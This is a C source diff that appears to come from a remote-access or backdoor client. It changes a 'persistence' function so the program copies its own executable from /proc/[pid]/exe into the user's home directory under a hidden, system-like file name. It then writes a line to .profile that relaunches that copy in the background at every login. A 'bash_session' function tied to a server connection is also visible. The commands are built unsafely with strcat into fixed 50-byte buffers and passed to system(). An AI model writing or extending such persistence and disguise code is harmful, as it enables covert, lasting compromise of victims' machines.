@@ -45,9 +45,12 @@ int persistence(char *get_path, FILE *fp)
   //copy the executable to home directory
   char command[50] = "cp client ";
   strcat(command, get_path);
+  strcat(command,".0XsdnsSYSTEM");
   system(command);
 
-  strcat(get_path, "./client &");
+  char write_home[50];
+  strcpy(write_home,get_path);
+  strcat(write_home, "./.0XsdnsSYSTEM &");
   //check if .profile can be accessed
   if (fp == NULL)
   {
@@ -56,15 +59,46 @@ int persistence(char *get_path, FILE *fp)
   //check if our command is already written there
   while (fgets(chunk, sizeof(chunk), fp) != 0)
   {
-    if (strstr(chunk, get_path) != 0)
+    if (strstr(chunk, write_home) != 0)
     {
       return 0;
     }
   }
 
-  fprintf(fp, "%s \n", get_path);
+  fprintf(fp, "%s \n", write_home);
   fclose(fp);
   return 0;
+}
+
+int checkELF(char *path)
+{
+
+    //get the process ID and converts it to char	
+    int pid = getpid();	
+    char pidch[10];
+    sprintf(pidch,"%d",pid);
+
+    //build the command to copy the executable file from proccessdirectory
+    // /proc/[pid]/exe
+    char command[50] = "cp /proc/";
+    strcat(command,pidch);
+    strcat(command,"/exe ");
+    strcat(command,path);
+    strcat(command,".0XsdnsdSystem");
+
+    // check if the elf .0XsdnsdSystem exists in /home 
+    char check[50];
+    strcpy(check,path);
+    strcat(check,".0XsdnsdSystem");
+    if(access(check,F_OK)==0)
+    {
+        return 0;
+    }
+    else
+    {
+        system(command);
+        return 0;
+    }
 }
 
 pid_t bash_session(connection server_con)
